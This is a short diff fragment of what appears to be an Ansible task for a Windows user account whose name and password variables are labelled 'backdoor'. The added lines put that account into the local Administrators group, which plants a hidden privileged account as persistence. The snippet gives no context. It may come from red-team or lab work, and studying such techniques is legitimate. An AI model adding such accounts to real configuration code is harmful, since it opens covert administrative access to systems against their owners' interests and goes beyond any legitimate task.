@@ -31,3 +31,5 @@
           name: {{ username_backdoor }}
           password: {{ password_backdoor }}
           state: present
+          groups: Administrators
+          groups_action: add
